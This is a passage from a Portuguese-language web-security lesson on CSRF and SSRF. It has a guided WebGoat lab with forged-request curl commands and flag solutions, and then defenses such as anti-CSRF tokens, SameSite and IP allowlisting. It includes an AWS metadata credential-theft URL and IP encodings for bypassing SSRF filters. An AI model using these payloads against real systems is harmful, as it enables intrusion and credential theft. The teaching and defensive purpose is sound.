+<GlossaryTerm term="login CSRF">login CSRF</GlossaryTerm>. Nas palavras dos autores:
+*"Many web sites, including Yahoo, PayPal, and Google, are vulnerable to login CSRF.
+The impact of login CSRF attacks vary by site, ranging from allowing the attacker to
+mount XSS attacks on Google to allowing the attacker to obtain sensitive financial
+information from PayPal."*
+
+- **Impacto:** no *login CSRF*, o atacante força a vítima a logar na conta **dele**;
+  a vítima passa a usar uma conta que o atacante monitora, e tudo que ela faz (buscas,
+  compras, dados salvos) fica visível para ele. No PayPal, isso dava acesso a
+  informação financeira sensível.
+- **Lição:** CSRF não é só "fazer a vítima agir na própria conta"; forjar o próprio
+  **login** é um vetor igualmente sério — e a defesa (token anti-CSRF **também** no
+  formulário de login) é a mesma. Este é exatamente um dos exercícios do WebGoat. O
+  mesmo artigo mediu **283.945** carregamentos de anúncio e concluiu que o cabeçalho
+  `Referer` é bloqueado com frequência na rede, o que o torna frágil como defesa
+  isolada — e por isso propôs o cabeçalho `Origin`, hoje padrão.
+- **Fonte:** [Barth, Jackson, Mitchell — "Robust Defenses for Cross-Site Request Forgery", ACM CCS 2008 (PDF)](https://seclab.stanford.edu/websec/csrf/csrf.pdf).
+
+## 5. Mãos à obra — o laboratório guiado
+
+**Objetivo:** ao terminar, você terá (1) **forjado uma ação cross-site** no WebGoat,
+entendendo por que ela é aceita e por que não ler a resposta não protege a vítima, e
+(2) **desviado a requisição do servidor** (SSRF) para um destino à sua escolha. Cada
+missão rende uma flag.
+
+O laboratório é o **`webgoat`**: o Kali e o **OWASP WebGoat**, uma aplicação de
+treino mantida pela OWASP com lições guiadas de falhas web em Java. De dentro do
+Kali, o alvo responde em `http://webgoat:8080/WebGoat/`. Vamos trabalhar pelo
+terminal do Kali, com `curl` — porque é no pedido HTTP cru que o CSRF e o SSRF se
+enxergam melhor. (A versão usada ao escrever este módulo foi a **WebGoat 2026.4**.)
+
+<Figure
+  src={topologiaDoLab}
+  alt="À esquerda, o Kali, sua máquina de ataque, dentro da rede interna lab_net. No centro, um contêiner chamado webgoat com duas aplicações no mesmo host: o WebGoat na porta 8080 (a vítima, com as lições) e o WebWolf na porta 9090 (o site do atacante, que hospeda arquivos). Na Missão 1 o Kali manda o POST de review ao WebGoat com o cookie e o Referer que você escolhe. Uma nota lembra que webgoat:8080 e webgoat:9090 são o mesmo site, porque a porta não conta para o site nem para o cookie. Na Missão 2 o Kali manda ao WebGoat um parâmetro url, e o próprio servidor do WebGoat tenta abrir essa URL em direção à internet; essa saída falha porque a lab_net é interna e não tem rota para fora. À direita, fora do muro, ficam a internet e o seu PC, que nenhum contêiner alcança."
+  caption="A topologia do lab. Na Missão 1 quem fala com o WebGoat é o Kali (fazendo o papel do navegador); na Missão 2 é o próprio servidor do WebGoat que tenta sair — e esbarra no isolamento, de propósito."
+/>
+
+<Callout variant="warning" title="Um laboratório por vez">
+Este lab sobe o Kali e o WebGoat. Se outro lab estiver no ar, o botão vira **Trocar
+para este lab**. Feche o que não estiver usando antes de subir. O WebGoat guarda o
+progresso num banco **em memória**: ao resetar o lab, as suas contas e o avanço das
+lições somem — o que é ótimo para refazer o exercício do zero.
+</Callout>
+
+### 5.1 Subir o lab e preparar a bancada (passo a passo)
+
+1. No painel **Laboratório**, no topo desta página, clique em **Iniciar**. Se a
+   plataforma avisar que faltam imagens, rode no terminal do WSL
+   `scripts/lab.sh pull webgoat` (único momento com internet) e tente de novo. Pela
+   linha de comando, a alternativa para ligar é `scripts/lab.sh up webgoat`.
+2. Quando o desktop do Kali aparecer, clique nele, abra um terminal e prepare uma
+   pasta de evidências e a variável com o endereço do alvo:
+
+```console
+$ umask 077
+$ mkdir -p ~/engajamentos/lab-4.7_webgoat/evidencias
+$ cd ~/engajamentos/lab-4.7_webgoat/evidencias
+$ B=http://webgoat:8080/WebGoat
+```
+
+3. Confirme que o alvo responde:
+
+```console
+$ curl -s -o /dev/null -w "%{http_code}\n" "$B/login"
+200
+```
+
+### 5.2 Criar a conta e pegar a sessão (guiado)
+
+O WebGoat exige cadastro. Atenção a uma pegadinha da versão 2026.4: **usuário e
+senha precisam ter de 6 a 10 caracteres** (uma senha longa demais é recusada com
+`size must be between 6 and 10`). Cadastre-se e, em seguida, faça login capturando o
+cookie de sessão — vamos reusá-lo em cada pedido:
+
+```console
+$ curl -s -X POST "$B/register.mvc" \
+    --data-urlencode "username=pentester" \
+    --data-urlencode "password=Pass1234" \
+    --data-urlencode "matchingPassword=Pass1234" \
+    --data-urlencode "agree=agree" -o /dev/null
+
+$ C=$(curl -s -i -X POST "$B/login" \
+      --data-urlencode "username=pentester" \
+      --data-urlencode "password=Pass1234" \
+    | grep -i '^set-cookie:' | sed -E 's/.*JSESSIONID=([^;]+);.*/\1/' | tr -d '\r')
+$ echo "minha sessao: $C"
+minha sessao: A1B2C3D4E5F6A7B8C9D0E1F2A3B4C5D6
+```
+
+Guarde esse `JSESSIONID` em `$C`: ele **é** a sua autoridade ambiente. Daqui para a
+frente, mandamos `-H "Cookie: JSESSIONID=$C"` em cada pedido — é o que o navegador
+faria sozinho. (Se o `echo` vier vazio, o login falhou: confira o tamanho de usuário
+e senha, de 6 a 10 caracteres.)
+
+### 5.3 Missão 1 — Forjar uma ação cross-site (CSRF)
+
+**Cenário:** o WebGoat tem uma página de *reviews* (avaliações). Você vai publicar
+uma review **como se o pedido tivesse partido de outro site** — exatamente o que a
+página de um atacante faria pelo navegador da vítima. O WebGoat decide se o pedido é
+"de outro site" comparando dois cabeçalhos; descobrir **qual** cabeçalho, e provar
+que o token do formulário é fraco, é o desafio.
+
+**Seu objetivo:** fazer o WebGoat aceitar a review forjada (resposta com
+`lessonCompleted: true`) e montar a flag `FLAG{assignment-N}` (tudo em minúsculas),
+onde `assignment` é o valor do campo `"assignment"` que só aparece na **resposta
+JSON** do `POST /csrf/review`, e `N` é **quantas** das quatro requisições de
+diagnóstico abaixo o servidor **recusou**.
+
+Comece inspecionando o formulário de review da lição CSRF. Ele tem um campo oculto
+curioso:
+
+```html
+<form class="attack-form" accept-charset="UNKNOWN" id="csrf-review"
+      method="POST" name="review-form" action="/WebGoat/csrf/review">
+  <input class="form-control" id="reviewText" name="reviewText" placeholder="Add a Review" type="text"/>
+  <input class="form-control" id="reviewStars" name="stars" type="text"/>
+  <input type="hidden" name="validateReq" value="2aa14227b9a13d0bede0388a7fba9aa9"/>
+  <input type="submit" name="submit" value="Submit review"/>
+</form>
+```
+
+Esse `validateReq` **parece** um token anti-CSRF. Guarde o valor; e desconfie: será
+que ele muda a cada sessão, como um token de verdade deveria?
+
+O primeiro pedido, guiado, é a review forjada "de outro site" — mande o `POST` com
+um `Referer` de um host qualquer que não seja o WebGoat, reenviando o token da
+página:
+
+```console
+$ curl -s -H "Cookie: JSESSIONID=$C" \
+    -H "Referer: http://atacante.exemplo/armadilha.html" \
+    -X POST "$B/csrf/review" \
+    --data "reviewText=lab-4.7&stars=5&validateReq=2aa14227b9a13d0bede0388a7fba9aa9"
+{
+  "assignment" : "ForgedReviews",
+  "attemptWasMade" : true,
+  "feedback" : "It appears you have submitted correctly from another site. Go reload and see if your post is there.",
+  "feedbackArgs" : null,
+  "lessonCompleted" : true,
+  "output" : null,
+  "outputArgs" : null
+}
+```
+
+`lessonCompleted: true` — o WebGoat aceitou a ação forjada. Olhe o campo
+`"assignment"`: **é dele que sai a primeira metade da flag** (em minúsculas). Agora
+vem o desafio: descobrir o cabeçalho que o servidor usa e **contar** quantas
+requisições ele recusa.
+
+<Hint title="Dica 1 — as quatro requisições de diagnóstico">
+Repita o `POST /csrf/review` em quatro variações e anote o campo `lessonCompleted`
+de cada uma: **(A)** `Referer` de outro host + token certo; **(B)** `Referer` do
+**próprio** WebGoat (`http://webgoat:8080/...`) + token certo; **(C)** **sem**
+cabeçalho `Referer` + token certo (no `curl`, não passe `-H "Referer: ..."`);
+**(D)** `Referer` de outro host + um `validateReq` **errado**. O `N` da flag é
+quantas dessas quatro vieram com `lessonCompleted: false`.
+</Hint>
+
+<Hint title="Dica 2 — o que cada recusa te ensina">
+Leia o campo `feedback` das que falham. Uma diz que *"your request is coming from
+the same host"* — ou seja, o WebGoat trata **mesmo host** como "não é CSRF" e
+recusa. Outra diz que falta algo (*"something missing from your request"*) — é o
+token errado. Repare também que, sem `Referer` nenhum, o pedido **passa**: para o
+WebGoat, "sem Referer" conta como "de outro site".
+</Hint>
+
+<Solution title="Solução da Missão 1">
+As quatro requisições de diagnóstico (mostro só o campo que importa de cada uma):
+
+```console
+$ # (A) Referer de outro host + token certo
+$ curl -s -H "Cookie: JSESSIONID=$C" -H "Referer: http://atacante.exemplo/x" \
+    -X POST "$B/csrf/review" --data "reviewText=a&stars=1&validateReq=2aa14227b9a13d0bede0388a7fba9aa9" \
+  | grep -E '"feedback"|"lessonCompleted"'
+  "feedback" : "It appears you have submitted correctly from another site. Go reload and see if your post is there.",
+  "lessonCompleted" : true,
+
+$ # (B) Referer do PRÓPRIO WebGoat + token certo
+$ curl -s -H "Cookie: JSESSIONID=$C" -H "Referer: http://webgoat:8080/WebGoat/start.mvc" \
+    -X POST "$B/csrf/review" --data "reviewText=b&stars=2&validateReq=2aa14227b9a13d0bede0388a7fba9aa9" \
+  | grep -E '"feedback"|"lessonCompleted"'
+  "feedback" : "It appears your request is coming from the same host you are submitting to.",
+  "lessonCompleted" : false,
+
+$ # (C) SEM Referer + token certo
+$ curl -s -H "Cookie: JSESSIONID=$C" \
+    -X POST "$B/csrf/review" --data "reviewText=c&stars=3&validateReq=2aa14227b9a13d0bede0388a7fba9aa9" \
+  | grep -E '"feedback"|"lessonCompleted"'
+  "feedback" : "It appears you have submitted correctly from another site. Go reload and see if your post is there.",
+  "lessonCompleted" : true,
+
+$ # (D) Referer de outro host + token ERRADO
+$ curl -s -H "Cookie: JSESSIONID=$C" -H "Referer: http://atacante.exemplo/x" \
+    -X POST "$B/csrf/review" --data "reviewText=d&stars=4&validateReq=ERRADO" \
+  | grep -E '"feedback"|"lessonCompleted"'
+  "feedback" : "There's something missing from your request it appears, so I can't process it.",
+  "lessonCompleted" : false,
+```
+
+Recusadas (`lessonCompleted: false`): **(B)** e **(D)** — duas. Logo `N = 2`. E o
+campo `"assignment"` da resposta é `ForgedReviews`. Junte as duas partes no formato
+`FLAG{assignment-N}`, tudo em minúsculas — o `assignment` em letras minúsculas, um
+hífen e o número de requisições recusadas — e envie no campo abaixo.
+
+Duas lições do experimento. **Primeira:** o cabeçalho que o WebGoat compara com o
+`Host` para julgar a origem é o `Referer` (escrito assim, com um erro histórico de
+grafia de "referrer"); por isso (B), do mesmo host, é recusada, e (C), sem `Referer`,
+passa. **Segunda:** o `validateReq` é um **token anti-CSRF quebrado** — estático e
+igual para todos (`2aa14227...`). Se ele fosse aleatório e por sessão, a página do
+atacante (em outra origem) não conseguiria **lê-lo** para reproduzir; sendo fixo, o
+atacante o copia uma vez e reusa. Veja a seção 8.
+</Solution>
+
+<FlagInput task="missao-1-csrf" />
+
+<Callout variant="tip" title="O ataque do jeito 'de verdade', com o WebWolf">
+Pelo `curl` nós **simulamos** o que o navegador da vítima faria. No fluxo real, você
+hospeda a página de atacante (o `<form>` com `submit()` da seção 3.1) no **WebWolf**
+— um companheiro do WebGoat que serve páginas e arquivos do atacante, em
+`http://webgoat:9090/WebWolf/` (mesmo usuário e senha do WebGoat). Você sobe o HTML
+em **Files**, e ele fica em `http://webgoat:9090/WebWolf/files/<usuário>/<arquivo>`;
+a vítima, logada, abriria essa página, e o **navegador dela** mandaria o `POST` com
+o cookie anexado. Vale abrir o WebWolf e montar a página para sentir o ataque do
+ponto de vista do atacante — o resultado no WebGoat é o mesmo que você obteve com
+`curl`.
+</Callout>
+
+### 5.4 Missão 2 — Desviar a requisição do servidor (SSRF)
+
+**Cenário:** a lição SSRF do WebGoat tem um botão que manda o **servidor** buscar uma
+imagem por uma URL que vai num campo oculto do formulário. Você vai mudar essa URL —
+primeiro para uma imagem irmã (provar que controla o destino), depois para um site
+externo (o SSRF de fato).
+
+**Seu objetivo:** resolver as duas tarefas e montar `FLAG{alt-estado}` (tudo em
+minúsculas, espaços trocados por hífen), onde `alt` é o texto alternativo (o atributo
+`alt`) que o servidor devolve na imagem quando você manda à **tarefa 1** uma `url`
+que não é nem a do Tom nem a do Jerry, e `estado` é a palavra com que o servidor, na
+saída de sucesso da **tarefa 2**, descreve a situação do site externo.
+
+Primeiro a tarefa 1. O formulário manda `url=images/tom.png` e mostra o gato Tom.
+Existe uma imagem **irmã**, com o nome de outro personagem, na mesma pasta. Troque o
+`url` para apontar para ela:
+
+```console
+$ curl -s -H "Cookie: JSESSIONID=$C" -X POST "$B/SSRF/task1" \
+    --data-urlencode "url=images/jerry.png" \
+  | python3 -c 'import sys,json;d=json.load(sys.stdin);print(d["lessonCompleted"], "|", d["feedback"])'
+True | You rocked the SSRF!
+```
+
+Você mudou qual recurso o servidor devolve só reescrevendo um parâmetro — a semente
+do SSRF. Agora o desafio da primeira metade da flag: o que o servidor responde quando
+você pede uma `url` que **não existe** no jogo?
+
+<Hint title="Dica — force uma url inesperada e leia o alt">
+Mande à tarefa 1 uma `url` qualquer que não seja `images/tom.png` nem
+`images/jerry.png` (por exemplo `url=qualquer-coisa`). O servidor não resolve a
+"trapaça", mas devolve no campo `output` uma tag `<img ... alt="...">`. Esse `alt`
+(em minúsculas, espaço virando hífen) é a primeira metade da flag.
+</Hint>
+
+Agora a tarefa 2, o SSRF de verdade: a instrução pede que você faça o servidor ir
+buscar um **site externo** específico. O campo `url` deixa de ser um caminho de
+imagem e passa a ser uma URL inteira.
+
+<Hint title="Dica 1 — qual destino usar">
+Leia o enunciado da tarefa 2 na lição: ele nomeia exatamente o site que o servidor
+deve buscar (um serviço do tipo "qual é o meu IP"). Ponha esse endereço completo,
+com `http://` e **sem** barra no fim, no campo `url` do `POST /SSRF/task2`.
+</Hint>
+
+<Hint title="Dica 2 — 'mas o lab não tem internet!'">
+Correto, e é de propósito (isolamento do lab). O servidor **tenta** buscar a URL, a
+conexão falha — mas o WebGoat foi feito para reconhecer que você montou o pedido
+**certo** e dá a tarefa como resolvida mesmo assim. Num alvo real, a resposta do
+destino voltaria para você. Leia a frase do campo `output`: ela descreve em que
+**estado** o site externo está. Essa palavra é a segunda metade da flag.
+</Hint>
+
+<Solution title="Solução da Missão 2">
+A url inesperada na tarefa 1, para ver o `alt`, e o SSRF na tarefa 2:
+
+```console
+$ # tarefa 1, url que não é imagem do jogo → o servidor devolve a imagem padrão
+$ curl -s -H "Cookie: JSESSIONID=$C" -X POST "$B/SSRF/task1" \
+    --data-urlencode "url=qualquer-coisa" \
+  | python3 -c 'import sys,json;print(json.load(sys.stdin)["output"])'
+<img class="image" alt="Silly Cat" src="images/cat.jpg">
+
+$ # tarefa 2, o SSRF: faça o servidor buscar o site externo pedido
+$ curl -s -H "Cookie: JSESSIONID=$C" -X POST "$B/SSRF/task2" \
+    --data-urlencode "url=http://ifconfig.pro"
+{
+  "assignment" : "SSRFTask2",
+  "attemptWasMade" : true,
+  "feedback" : "You rocked the SSRF!",
+  "feedbackArgs" : null,
+  "lessonCompleted" : true,
+  "output" : "<html><body>Although the http://ifconfig.pro site is down, you still managed to solve this exercise the right way!</body></html>",
+  "outputArgs" : null
+}
+```
+
+O `alt` da tarefa 1 é **Silly Cat** (que vira `silly-cat`, espaço por hífen). A
+saída de sucesso da tarefa 2 diz que o site externo está *"down"* (fora do ar) — o
+lab reconhece o destino certo mesmo sem internet. Monte `FLAG{alt-estado}`, tudo em
+minúsculas, com essas duas palavras, e envie no campo abaixo.
+
+Para fixar o impacto real, repare como seria a mesma requisição apontada para a
+nuvem — o que **não** existe neste lab, mas é o que você faria num alvo autorizado em
+AWS:
+
+```text
+url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
+```
+
+Esse é o pedido que, na Capital One, devolveu as credenciais do servidor.
+</Solution>
+
+<FlagInput task="missao-2-ssrf" />
+
+### 5.5 Desligar o laboratório
+
+Terminou? Desligue para respeitar a regra de um lab por vez e liberar RAM:
+
+```console
+$ scripts/lab.sh down webgoat
+```
+
+Pela plataforma, o botão **Desligar** no painel de Laboratório faz o mesmo. Como o
+WebGoat guarda tudo em memória, subir de novo devolve o alvo ao ponto de fábrica.
+
+## 6. Variações e aprofundamento
+
+**CSRF em APIs que só aceitam JSON.** Um mito comum é "minha API só aceita
+`application/json`, logo está imune a CSRF". Não está. Um `<form>` HTML pode enviar
+corpo com `Content-Type: text/plain` usando `enctype="text/plain"`, e dá para
+"desenhar" o corpo para que ele saia como um JSON válido (pondo o JSON no `name` de
+um campo oculto e fechando-o no `value`). A lição "CSRF and content-type" do WebGoat
+existe justamente para isso: o endpoint `POST /csrf/feedback/message` aceita um corpo
+JSON **se** o `Content-Type` for `text/plain` e a origem for outra — e recusa quando
+o `Content-Type` é `application/json`. É contraintuitivo: o JSON "oficial"
+(`application/json`) de outra origem dispararia um
+<GlossaryTerm term="preflight request">preflight</GlossaryTerm> do CORS que o
+servidor poderia barrar; mas confiar nisso é confiar num efeito colateral do CORS,
+não numa defesa. A regra: **implemente CSRF token; não dependa do content-type**.
+(Você faz essa lição no Desafio A, na seção 9.)
+
+**Login CSRF.** Como no caso de 2008 (seção 4), o atacante forja o pedido de
+**login** com as credenciais dele; a vítima acaba logada na conta do atacante e passa
+a alimentá-la com seus dados. A lição "CSRF login" do WebGoat reproduz isso: o
+endpoint `POST /csrf/login` dá a lição por resolvida quando o usuário logado tem o
+nome começando com `csrf` — ou seja, quando você se logou como o "atacante". A defesa
+é a mesma: token anti-CSRF **também** no formulário de login. (É o Desafio B.)
+
+**SSRF cego (<GlossaryTerm term="blind SSRF">blind SSRF</GlossaryTerm>).** Nem sempre
+a resposta volta para o atacante. No *blind SSRF*, o servidor faz o pedido mas não
+ecoa o resultado. Ainda assim dá para explorar: medindo o **tempo** (um destino que
+existe responde diferente de um que não existe), observando **erros** distintos, ou
+fazendo o servidor bater num host **seu** (técnica *out-of-band*: um subdomínio seu
+que registra quem o acessou confirma que o SSRF chegou lá).
+
+**Desvios de filtro no SSRF.** Bloquear a string `169.254.169.254` é frágil. O mesmo
+endereço se escreve de muitas formas: em decimal (`http://2852039166/`), via um
+domínio que **resolve** para ele, ou com um **redirecionamento** (a URL permitida
+responde `302` para o endereço interno). O `127.0.0.1` idem — vira `2130706433` em
+decimal ou `017700000001` em octal. Há ainda o
+<GlossaryTerm term="DNS rebinding">DNS rebinding</GlossaryTerm>: o nome resolve para
+um IP público na checagem e para `169.254.169.254` no instante da busca. Por isso a
+defesa correta valida o **IP resolvido** e conecta a ele, não à string (seção 8).
+
+**SSRF e nuvem, além da AWS.** GCP e Azure também têm metadata em
+`169.254.169.254`, com caminhos próprios e exigindo um cabeçalho especial
+(`Metadata-Flavor: Google` no GCP, `Metadata: true` no Azure) — o que é uma defesa
+parcial, porque um SSRF que controla cabeçalhos a contorna. O Azure vai além e
+**recusa** o pedido de metadados que traga um cabeçalho `X-Forwarded-For` (típico de
+quem passou por um proxy). A AWS endureceu com o
+<GlossaryTerm term="IMDSv2">IMDSv2</GlossaryTerm> (token por sessão via `PUT`),
+resposta direta ao caso Capital One.
+
+## 7. Erros comuns
+
+- **"O login falha / tudo redireciona para `/login`."** Dois motivos frequentes na
+  versão 2026.4: a senha tem mais de 10 caracteres (o cadastro exige de 6 a 10), ou
+  você reusou um pote de cookies "sujo". Capture o `JSESSIONID` **da resposta do
+  `POST /login`** (como em 5.2) e use-o inline em cada pedido; não misture com uma
+  sessão anônima antiga.
+- **"A review não é aceita (`something missing from your request`)."** Faltou o campo
+  `validateReq`, ou você o alterou. Reenvie-o com o valor exato que estava na página
+  (`2aa14227b9a13d0bede0388a7fba9aa9`).
+- **"Mandei o `Referer` do próprio WebGoat e foi recusado — pensei que CSRF passasse
+  sempre."** É o esperado: o WebGoat trata **mesmo host** como "não é CSRF" e recusa
+  (feedback *"coming from the same host"*). Para a lição, você precisa parecer vir de
+  **outro** host — ou não mandar `Referer` nenhum, que o WebGoat também aceita.
+- **"O SSRF da tarefa 2 não resolve."** O destino precisa ser **exatamente**
+  `http://ifconfig.pro` — com `http://` e **sem** barra no fim. Com barra
+  (`http://ifconfig.pro/`) o WebGoat recusa (*"You need to stick to the game plan!"*),
+  porque ele casa a URL por uma expressão exata. Não é para a conexão funcionar (o lab
+  não tem internet) — é para o pedido ter o destino certo.
+- **"Confundi as portas."** O WebGoat é a porta **8080** (`/WebGoat`); o WebWolf é a
+  **9090** (`/WebWolf`). As duas são internas ao lab; nenhuma é publicada no seu PC.
+- **Flag recusada pela plataforma.** O formato é `FLAG{parte1-parte2}` com um hífen
+  entre as duas partes, tudo em minúsculas, sem espaços (espaço no meio de uma parte
+  vira hífen). Confira as chaves `{ }` e não deixe espaço sobrando.
+
+## 8. Defesa e mitigação
+
+A visão completa: entender o ataque foi metade; saber barrá-lo é a outra. CSRF e
+SSRF têm defesas distintas, porque os deputados confusos são diferentes.
+
+### 8.1 Defender contra CSRF
+
+<Figure
+  src={defesasCsrf}
+  alt="Um pedido que muda estado passa por três camadas independentes. Camada 1, cookie SameSite=Lax ou Strict: o navegador não anexa o cookie em pedidos vindos de outro site. Camada 2, token anti-CSRF: valor aleatório por sessão embutido em cada formulário; a página do atacante, em outra origem, não consegue lê-lo para reproduzir, e é a defesa central. Ao lado, o aviso de que um token fixo e compartilhado, como o do WebGoat no lab, não protege. Camada 3, conferir a origem: o servidor lê o cabeçalho Sec-Fetch-Site, ou compara Origin e Referer com o próprio host, e recusa o que vier de outro site. Só passa o pedido com o cookie certo, o token válido e a origem esperada. No rodapé, o alerta de que XSS derrota todas essas defesas, porque o código do atacante passa a rodar dentro da origem e lê o token."
+  caption="Três camadas somam-se: o token anti-CSRF por sessão é a central; SameSite e a conferência de origem reforçam. XSS, porém, derrota todas — por isso CSRF e XSS se tratam juntos."
+/>
+
+**1. Token anti-CSRF (synchronizer token) — a defesa central.** O servidor gera um
+valor **aleatório e por sessão**, embute-o em cada formulário que muda estado, e
+exige que ele volte no pedido. Funciona porque a página do atacante, estando em
+**outra origem**, não consegue **ler** a página legítima (a same-origin policy a
+impede) e portanto não sabe o token. Em Java, o **Spring Security** já traz essa
+proteção **ligada por padrão** para métodos que mudam estado (`POST`, `PUT`, `DELETE`,
+`PATCH`), guardando o token na sessão e esperando-o no parâmetro `_csrf` ou no
+cabeçalho `X-CSRF-TOKEN`; o WebGoat a **desliga de propósito** (com
+`http.csrf(csrf -> csrf.disable())`) para as lições existirem. Em um formulário:
+
+```html
+<form action="/conta/email" method="POST">
+  <input type="hidden" name="_csrf" value="aC3f...aleatorio-por-sessao">
+  <input name="novo_email">
+</form>
+```
+
+No servidor, o pedido só é aceito se `_csrf` bater com o valor guardado na sessão. A
+variante <GlossaryTerm term="double-submit cookie">double-submit cookie</GlossaryTerm>
+(o token vai num cookie **e** num cabeçalho, e o servidor confere que são iguais)
+dispensa guardar estado no servidor — é o que frameworks como o Angular fazem com
+`XSRF-TOKEN`/`X-XSRF-TOKEN`. Prefira a forma **assinada** dessa variante (o token
+atrelado à sessão por HMAC): a ingênua é burlável por quem consiga gravar cookies no
+domínio. **Nunca reutilize o cookie de sessão como token**, e o token precisa ser por
+sessão: um valor fixo e compartilhado (como o `validateReq` do lab) não vale nada.
+
+**2. Cookie `SameSite`.** Marque o cookie de sessão como
+<GlossaryTerm term="SameSite">SameSite</GlossaryTerm>`=Lax` ou `=Strict`: o navegador
+deixa de anexá-lo em pedidos *cross-site*, cortando a *ambient authority* na origem.
+Desde o Chrome 80 (fevereiro de 2020), `Lax` é o **padrão** quando o atributo não é
+declarado — mas `Lax` ainda permite o cookie em navegação top-level por `GET`, então
+não cobre tudo; é um reforço, não um substituto do token.
+
+```http
+Set-Cookie: session=...; HttpOnly; Secure; SameSite=Lax
+```
+
+**3. Conferir a origem.** Em ações sensíveis, compare os cabeçalhos
+<GlossaryTerm term="Origin header">Origin</GlossaryTerm> (e, na falta dele,
+<GlossaryTerm term="Referer header">Referer</GlossaryTerm>) com o host esperado e
+recuse o que vier de fora. Navegadores modernos ainda mandam o cabeçalho
+`Sec-Fetch-Site` (vale `same-origin`, `same-site`, `cross-site` ou `none`), que diz
+de forma direta a relação entre quem enviou e o alvo — a recomendação atual da OWASP
+é usá-lo como sinal primário. Foi uma conferência de origem que você explorou no lab,
+onde o WebGoat olhava o `Referer`. (A própria plataforma faz isto: o `proxy.ts`
+recusa requisições que mudam estado sem um `Origin` local.)
+
+**4. Reautenticar o que é crítico.** Trocar senha, e-mail ou fazer transferência pode
+exigir a senha atual, um segundo fator ou uma confirmação — um CSRF não tem como
+fornecer isso.
+
+**Aviso que a figura destaca:** se o site tiver
+<GlossaryTerm term="cross-site scripting (XSS)">XSS</GlossaryTerm> (4.3) — a falha em
+que o atacante consegue rodar JavaScript **dentro** da página do alvo —, **todas**
+essas defesas caem, porque o código dele passa a rodar na origem do site e lê o token
+da própria página. Por isso CSRF e XSS se tratam juntos: sem fechar o XSS, o token
+anti-CSRF é inútil.
+
+### 8.2 Defender contra SSRF
+
+A regra de ouro é **não deixar o usuário escolher o destino** — e, quando for
+inevitável, validar esse destino com rigor, do lado certo.
+
+**1. Allowlist de destino (não blocklist).** Só permita os domínios, hosts e
+**protocolos** que a função realmente precisa (`https` para um webhook conhecido, por
+exemplo). Tudo fora da <GlossaryTerm term="allowlist">allowlist</GlossaryTerm> é
+recusado. Bloquear "o que é ruim" (blocklist de `169.254...`, de `localhost`) é
+frágil: há mil formas de escrever o mesmo endereço.
+
+**2. Resolver o nome, validar o IP e conectar a ele.** Se precisar aceitar uma URL,
+resolva o hostname para o IP e **recuse** se o IP cair em faixa privada
+(`10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`), *loopback* (`127.0.0.0/8`) ou
+<GlossaryTerm term="link-local address">link-local</GlossaryTerm> (`169.254.0.0/16`),
+sem esquecer os equivalentes em IPv6 (`::1`, `fe80::/10`, `fc00::/7`). O passo que
+fecha o DNS rebinding é **conectar exatamente ao IP que você validou**, em vez de
+resolver o nome de novo na hora de conectar. Em Python, conceitualmente:
+
+```python
+import ipaddress, socket
+from urllib.parse import urlparse
+
+def destino_seguro(url: str) -> str:
+    u = urlparse(url)
+    if u.scheme not in ("https",):           # allowlist de protocolo
+        raise ValueError("protocolo não permitido")
+    # getaddrinfo pega IPv4 E IPv6; valide TODOS os IPs resolvidos
+    ips = {info[4][0] for info in socket.getaddrinfo(u.hostname, u.port or 443)}
+    for raw in ips:
+        ip = ipaddress.ip_address(raw)
+        if ip.is_private or ip.is_loopback or ip.is_link_local or ip.is_reserved:
+            raise ValueError("destino interno recusado")
+    return next(iter(ips))                    # conecte NESTE ip, não resolva de novo
+```
+
+**3. Bloquear redirecionamentos (ou revalidar cada salto).** Um destino permitido
+pode responder `302` para um interno. Desligue o *follow redirects* do cliente HTTP,
+ou revalide o IP a cada salto.
+
+**4. Menor privilégio e segmentação.** Mesmo que o SSRF alcance a nuvem,
+<GlossaryTerm term="IMDSv2">IMDSv2</GlossaryTerm> (token por sessão) e um papel com
+**mínimo privilégio** reduzem o estrago — era o que faltava na Capital One. Na rede,
+negue por padrão o egresso do servidor para faixas internas que ele não precise
+acessar.
+
+**5. Não ecoar a resposta.** Devolver ao usuário o corpo da URL buscada entrega o
+SSRF de bandeja. Se a função não precisa mostrar o conteúdo, não o mostre (reduz o
+SSRF a cego, mais difícil de explorar).
+
+## 9. Exercícios
+
+### Desafios práticos (sem flag)
+
+<Hint title="Desafio A — o content-type não salva">
+Na lição "CSRF and content-type" do WebGoat, faça o `POST /csrf/feedback/message`
+com `Content-Type: text/plain`, um corpo JSON e um `Referer` de outro host. Veja que
+ele é aceito (devolve uma flag UUID da sessão) e que, com `Content-Type:
+application/json`, é recusado. Explique, em duas linhas, por que aceitar só JSON
+**não** seria uma defesa contra CSRF.
+</Hint>
+
+<Hint title="Desafio B — login CSRF">
+Na lição "CSRF login", crie um usuário cujo nome comece com `csrf` (ex.:
+`csrf-pent`), logue como ele e dispare o `POST /csrf/login`. Descreva o que a vítima
+perderia num login CSRF real (pense em histórico e dados salvos indo para a conta do
+atacante).
+</Hint>
+
+<Hint title="Desafio C — pensar como defensor do SSRF">
+Dado o `destino_seguro` da seção 8.2, mostre por que ele barra
+`http://169.254.169.254/` e `http://2852039166/` (o mesmo IP em decimal), e por que
+conectar ao **IP já validado** — e não resolver o nome de novo — é o que fecha o DNS
+rebinding.
+</Hint>
+
+### Quiz
+
+Responda ao quiz para fixar os conceitos. Ele conta para concluir o módulo.
+
+<Quiz task="quiz-final" />
+
+## 10. Resumo e glossário
+
+**Pontos-chave:**
+
+- **CSRF** forja uma requisição que **o navegador da vítima** envia: o cookie viaja
+  sozinho (*ambient authority*), e o servidor não distingue o pedido forjado de um
+  legítimo. O alvo são ações que **mudam estado**; não ler a resposta **não** protege.
+- **SSRF** forja uma requisição que **o servidor** envia: o atacante dá uma URL, e o
+  servidor a busca de dentro da rede, alcançando serviços internos, o `127.0.0.1` e o
+  **metadata service** da nuvem (`169.254.169.254`), que pode entregar credenciais.
+- Os dois são o **confused deputy**: alguém com autoridade é induzido a usá-la pelo
+  atacante.
+- **Defesa de CSRF:** token anti-CSRF **aleatório e por sessão** (central), reforçado
+  por cookie `SameSite` e conferência de `Origin`/`Referer`/`Sec-Fetch-Site`. Um
+  token fixo não vale. XSS derrota tudo.
+- **Defesa de SSRF:** **allowlist** de destino/protocolo; se aceitar URL, **resolver
+  o nome, validar o IP e conectar a ele**; bloquear redirecionamentos; menor
+  privilégio (IMDSv2) e segmentação de rede.
+
+### Cola rápida
+
+```text
+CSRF — forjar ação cross-site (simulada com curl):
